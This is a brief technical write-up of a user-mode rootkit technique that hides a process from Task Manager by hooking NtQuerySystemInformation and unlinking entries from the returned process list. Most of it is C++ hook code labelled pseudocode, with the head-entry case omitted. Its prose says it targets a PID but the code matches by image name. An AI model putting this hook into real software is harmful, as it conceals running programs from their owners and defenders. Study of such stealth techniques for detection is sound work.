<!-- generated-from-dump2 -->
# User-Mode Process Hiding via NTAPI Hook

User-mode DLL injected into Task Manager (or any process that enumerates processes) that IAT/inline-hooks `NtQuerySystemInformation` and walks the returned `SYSTEM_PROCESS_INFORMATION` linked list to splice out the target PID before the caller sees it. The "trick" is that `SYSTEM_PROCESS_INFORMATION.NextEntryOffset` is a delta from the current entry; to hide entry N you add N's offset onto N-1's `NextEntryOffset` and zero N's. No kernel driver, no PsSetCreateProcessNotify — just a usermode hook on the documented enumeration API.

```cpp
// Pseudocode of the hook body
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS cls, PVOID buf, ULONG len, PULONG ret)
{
    NTSTATUS s = OrigNtQuerySystemInformation(cls, buf, len, ret);
    if (NT_SUCCESS(s) && cls == SystemProcessInformation) {
        auto* cur = (SYSTEM_PROCESS_INFORMATION*)buf;
        SYSTEM_PROCESS_INFORMATION* prev = nullptr;
        while (cur) {
            auto* next = cur->NextEntryOffset
                ? (SYSTEM_PROCESS_INFORMATION*)((BYTE*)cur + cur->NextEntryOffset)
                : nullptr;
            if (IsHiddenName(cur->ImageName)) {
                if (prev) {
                    prev->NextEntryOffset = next
                        ? (ULONG)((BYTE*)next - (BYTE*)prev) : 0;
                }
                // else: cur was head; caller's buf pointer stays valid,
                // we splice the next entry to position 0 (omitted).
            } else {
                prev = cur;
            }
            cur = next;
        }
    }
    return s;
}
```

## References
- <https://github.com/kernelm0de/ProcessHider>
